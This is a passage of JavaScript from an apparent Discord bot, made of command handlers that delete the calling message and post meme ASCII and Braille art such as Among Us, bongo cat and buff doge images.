            ⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣦⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣏⡿⠃⣼⡿⠤⣰⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠛⠃⣠⣿⣿⣿⣿⣿⣿⣿
            ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿
            ⣧⡀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣷⣄⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            `)
        }

        if (cmd === "amogus")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                          ⢀⣀⣀⣴⣆⣠⣤⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⣿⣯⣘⠹⣧⣤⡀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⢿⣿⣷⣾⣯⠉⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠜⣿⡍⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠃⡄⠀⠘⢿⣆⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣁⣋⣈ ⣤⣮⣿⣧⡀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
            ⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
            ⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀
            ⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
            ⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
            ⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
            ⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
            ⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
            ⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
            ⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
            ⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶   ⢠⣿⣿⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏  ⠀⢸⣿⡇⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            `)
        }

        if (cmd === "whentheimpostorissus")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ░█░█░█░█░█▀▀░█▀█                
            ░█▄█░█▀█░█▀▀░█░█                
            ░▀░▀░▀░▀░▀▀▀░▀░▀                
            ░▀█▀░█░█░█▀▀                    
            ░░█░░█▀█░█▀▀                    
            ░░▀░░▀░▀░▀▀▀                    
            ░▀█▀░█▄█░█▀█░█▀█░█▀▀░▀█▀░█▀█░█▀▄
            ░░█░░█░█░█▀▀░█░█░▀▀█░░█░░█░█░█▀▄
            ░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░▀░░▀▀▀░▀░▀
            ░▀█▀░█▀▀                        
            ░░█░░▀▀█                        
            ░▀▀▀░▀▀▀                        
            ░█▀▀░█░█░█▀▀                    
            ░▀▀█░█░█░▀▀█                    
            ░▀▀▀░▀▀▀░▀▀▀                                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            `)
        }

        if (cmd === "cursedcat")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⣼⡟⠉⠉⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⣠⣶⣿⠿⣿⣿⡿⣷⡀⠸⣿⣶⡀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠘⢿⣆⠀⣠⣾⣿⣿⣿⣶⣿⣿⣶⣿⠁⠀⣠⣿⡇⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣁⣤⣴⣿⠟⠁⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣿⣿⡟⠉⠉⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁⠀⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠹⢿⠁⡀⠀⠀⠀⠀⠀⠀⠸⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            `)
        }

        if (cmd === "girlstare")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⠄⣾⣿⡇⢸⣿⣿⣿⠄⠈⣿⣿⣿⣿⠈⣿⡇⢹⣿⣿⣿⡇⡇⢸⣿⣿⡇⣿⣿⣿
            ⢠⣿⣿⡇⢸⣿⣿⣿⡇⠄⢹⣿⣿⣿⡀⣿⣧⢸⣿⣿⣿⠁⡇⢸⣿⣿⠁⣿⣿⣿
            ⢸⣿⣿⡇⠸⣿⣿⣿⣿⡄⠈⢿⣿⣿⡇⢸⣿⡀⣿⣿⡿⠸⡇⣸⣿⣿⠄⣿⣿⣿
            ⢸⣿⡿⠷⠄⠿⠿⠿⠟⠓⠰⠘⠿⣿⣿⡈⣿⡇⢹⡟⠰⠦⠁⠈⠉⠋⠄⠻⢿⣿
            ⢨⡑⠶⡏⠛⠐⠋⠓⠲⠶⣭⣤⣴⣦⣭⣥⣮⣾⣬⣴⡮⠝⠒⠂⠂⠘⠉⠿⠖⣬
            ⠈⠉⠄⡀⠄⣀⣀⣀⣀⠈⢛⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⣀⣤⣤⣠⡀⠄⡀⠈⠁
            ⠄⠠⣾⡀⣾⣿⣧⣼⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣧⣼⣿⣿⢀⣿⡇⠄
            ⡀⠄⠻⣷⡘⢿⣿⣿⡿⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⢿⣿⣿⡿⢃⣾⠟⢁⠈
            ⢃⢻⣶⣬⣿⣶⣬⣥⣶⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣷⣾⣾⢣
            ⡄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠘
            ⣿⡐⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢠⢃
            ⣿⣷⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⠆⣼
            ⣿⣿⣷⡀⠄⠈⠛⢿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠿⠋⠠⠂⢀⣾⣿
            ⣿⣿⣿⣧⠄⠄⢵⢠⣈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⡁⢰⠏⠄⠄⣼⣿⣿
            ⢻⣿⣿⣿⡄⢢⠨⠄⣯⠄⠄⣌⣉⠛⠻⠟⠛⢋⣉⣤⠄⢸⡇⣨⣤⠄⢸⣿⣿⣿
            `)
        }

        if (cmd === "bongocat")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
                                       ⢠⣿⣶⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣀⡀⣠⣾⡇⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
            ⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⡇⠀⠀⠀⠀
            ⠀⣶⣿⣦⣜⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⡿⢿⡏⣴⣺⣦⣙⣿⣷⣄⠀⠀⠀
            ⠀⣯⡇⣻⣿⣿⣿⣿⣷⣾⣿⣬⣥⣭⣽⣿⣿⣧⣼⡇⣯⣇⣹⣿⣿⣿⣿⣧⠀⠀
            ⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣷⠀
            `)
        }

        if (cmd === "middlefinger")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
                          lﾆヽ
            　    　 |= | 
            　    　 |_ |
            　　/⌒|~ |⌒i-、
            　 /|　|　|　| ｜
            　｜(　(　(　(　｜
            　｜　　　　　 ｜
            　 ＼　　　　　/
            　　 ＼　　　 |
            `)
        }

        if (cmd === "aperocket")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎
            💎💎💎💎💎💎💎🚀💎💎💎💎💎💎💎
            💎💎💎💎💎💎🚀🚀🚀💎💎💎💎💎💎
            💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎
            💎💎💎💎💎🚀🚀🐵🚀🚀💎💎💎💎💎
            💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎
            💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎
            💎💎💎💎🚀🚀🚀🚀🚀🚀🚀💎💎💎💎
            💎💎💎🚀🚀🚀🚀🚀🚀🚀🚀🚀💎💎💎
            💎💎💎💎💎💎🚀🚀🚀💎 💎💎💎💎💎
            💎💎💎💎💎🍌🍌🍌🍌🍌💎💎💎💎💎
            💎💎💎💎💎💎🍌🍌🍌💎💎💎💎💎💎
            💎💎💎💎💎💎💎🍌💎💎💎💎💎💎💎
            💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎
            `)
        }

        if (cmd === "buffdoge")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ‎‎‎‎‎‎‎‎‎‎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⣤⠈⢿⣿⡿⠋⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⢸⣿⣷⠦⢀⣤⡚⠂⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⡾⠋⠀⢼⣥⡘⠃⣤⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢀⣦⡄⠀⠀⠀⠉⠁⠀⣤⣄⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢠⡾⠉⠃⠀⠀⠀⠠⣤⣰⣿⡗⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠋⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠙⠛⠿⢿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠁⠀⠀⢀⣀⡀⠤⠴⠲⣲⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿
            ⣿⣿⣿⣿⡿⠋⠡⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠉⠉⠉⠋⠁⠀⠀⠀⠀⠀⠠⠄⠙⢿⣿
            ⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿
            ⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠄⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
            ⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
            ⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
            ⡟⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄
            ⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇
            ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠑⠀⠀⠀⢀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀⠀⠀⡀⠀⠀⠾⠛⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠃
            ⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⡀⠀⠀⠈⠙⠓⠲⠀⠠⠄⠠⠴⠟⠒⠂⢀⡈⠁⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠈⠈⠄⠀⠀⠀⠀⠀⠀⠀⢠⠄⠀⠑⠀⠀⠀⠀⠀⠀⠀⢰
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡄⣿⣷⡀⠀⠀⠀⠀⠀⢀⠀⠐⠂⠤⠀⠐⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
            ⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⣿⣿⡇⠀⠞⠁⠂⠀⠀⠀⠠⠀⠠⠤⠀⠀⠀⡢⠀⠀⠀⠀⠀⠀⠀⡇⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
            ⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⣿⡇⠀⠲⢮⢀⠀⠀⠀⠀⠈⠤⠀⠄⠀⠀⡅⠀⠀⠀⠀⠀⡜⢡⠇⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
            ⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⡀⢹⣿⡇⠀⠓⡀⠀⠀⠀⠀⠀⠀⠀⠂⠒⠀⠀⠂⠀⠀⠀⠀⠀⠁⠸⠇⠀⡂⠀⠀⠀⠀⠀⠀⠀⠀⣾
            ⣿⣿⣦⠐⠀⠀⠀⠀⠀⠀⠀⠀⠳⣄⠙⠇⠸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠀⠐⠁⠀⠀⠀⠀⠘⠀⠀⣀⠤⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿
            ⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢠⡆⠀⡀⠀⠀⠀⠀⠀⢀⣼⡋⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿
            ⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠈⠳⠿⠀⣼⡐⡄⠀⠀⠀⠀⠀⡀⢠⢂⣿⣷⡇⢠⠀⠀⠀⡐⠀⠀⣧⣤⠂⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣤⡀⢠⠀⠀⠂⠀⠀⠀⢀⣿⡇⠸⢄⠀⠀⡠⠊⠀⢁⣾⣿⣿⡇⠸⠣⠀⠴⠅⠀⡄⡀⠁⠀⠀⠀⠀⠄⠀⣼⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⡄⣤⣤⣤⣤⣾⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢲⣷⡄⣠⣤⣄⡀⢀⣾⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣉⡿⣿⣿⣴⣿⣿⡀⠠⠀⠀⠀⢀⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⣀⣤⣼⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⢿⣿⣿⣿⠇⠠⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠀⣀⣤⣤⣭⣾⣿⣿⣿⣶⣶⣶⣶⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            `)
        }

        if (cmd === "girlbruh")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ‎‎‎‎‎‎‎‎‎‎⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹
            ⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀
            ⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀
            ⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀
            ⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀
            ⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰
            ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
            ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
            ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
            ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
            ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
            ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
            ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
            ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
            ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
            ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
            ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
            ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
            ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
            `)
        }

        if (cmd === "animeass")
        {
            message.delete()
            message.channel.send(`‎‎‎‎‎‎‎‎‎‎
            ⣿⣿⣿⣿⠛⠛⠉⠄⠁⠄⠄⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⡇⠄⠄⠄⠐⠄⠄⠄⠄⠄⠄⠄⠠⣿⣿⣿⣿⣿⣿
            ⣿⣿⡇⠄⢀⡀⠠⠃⡐⡀⠠⣶⠄⠄⢀⣿⣿⣿⣿⣿⣿
            ⣿⣿⣶⠄⠰⣤⣕⣿⣾⡇⠄⢛⠃⠄⢈⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡇⢀⣻⠟⣻⣿⡇⠄⠧⠄⢀⣾⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣟⢸⣻⣭⡙⢄⢀⠄⠄⠄⠈⢹⣯⣿⣿⣿⣿⣿
            ⣿⣿⣿⣭⣿⣿⣿⣧⢸⠄⠄⠄⠄⠄⠈⢸⣿⣿⣿⣿⣿
            ⣿⣿⣿⣼⣿⣿⣿⣽⠘⡄⠄⠄⠄⠄⢀⠸⣿⣿⣿⣿⣿
